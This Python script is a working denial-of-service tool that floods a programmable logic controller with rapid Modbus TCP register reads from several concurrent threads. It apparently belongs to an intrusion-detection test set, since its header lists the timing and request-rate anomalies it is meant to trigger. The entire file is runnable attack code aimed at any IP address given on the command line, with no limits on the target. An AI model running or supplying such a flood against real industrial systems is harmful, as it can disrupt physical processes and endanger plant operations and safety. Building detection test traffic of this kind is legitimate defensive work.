#!/usr/bin/env python3
"""
Attack: Denial of Service (DoS)
Floods PLC with rapid Modbus requests
Expected Detection: Extreme timing anomalies and request rate spikes
"""

import sys
import time
from pymodbus.client import ModbusTcpClient
import concurrent.futures

def flood_worker(target_ip: str, duration: int, worker_id: int):
    """Worker thread for flooding"""
    client = ModbusTcpClient(target_ip, port=502, timeout=0.5)
    
    if not client.connect():
        return {"worker_id": worker_id, "requests": 0}
    
    start_time = time.time()
    request_count = 0
    
    try:
        while (time.time() - start_time) < duration:
            # Rapid-fire requests with minimal delay
            client.read_holding_registers(0, count=10, slave=1)
            request_count += 1
            # Minimal delay - maximize request rate
            time.sleep(0.001)
    finally:
        client.close()
        
    return {"worker_id": worker_id, "requests": request_count}

def run_attack(target_ip: str, duration: int = 30, workers: int = 5):
    """
    Perform DoS flood attack with multiple threads
    
    Args:
        target_ip: Target PLC IP address
        duration: Attack duration in seconds
        workers: Number of concurrent worker threads
    """
    print(f"[*] Starting DoS flood attack on {target_ip}")
    print(f"[*] Duration: {duration} seconds")
    print(f"[*] Workers: {workers}")
    print(f"[*] This will flood the PLC with rapid requests")
    
    start_time = time.time()
    
    # Launch worker threads
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [
            executor.submit(flood_worker, target_ip, duration, i) 
            for i in range(workers)
        ]
        
        # Wait for completion
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
    
    elapsed = time.time() - start_time
    total_requests = sum(r['requests'] for r in results)
    
    print(f"\n[*] Attack complete!")
    print(f"[*] Total requests: {total_requests}")
    print(f"[*] Request rate: {total_requests / elapsed:.1f} requests/sec")
    print(f"[*] Elapsed time: {elapsed:.1f} seconds")
    
    for r in results:
        print(f"  Worker {r['worker_id']}: {r['requests']} requests")
    
    return {
        "status": "completed",
        "total_requests": total_requests,
        "request_rate": round(total_requests / elapsed, 2),
        "duration": round(elapsed, 2),
        "workers": workers
    }

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python dos_flood.py <target_ip> [duration_seconds] [num_workers]")
        sys.exit(1)
    
    target = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 30
    workers = int(sys.argv[3]) if len(sys.argv) > 3 else 5
    
    run_attack(target, duration, workers)
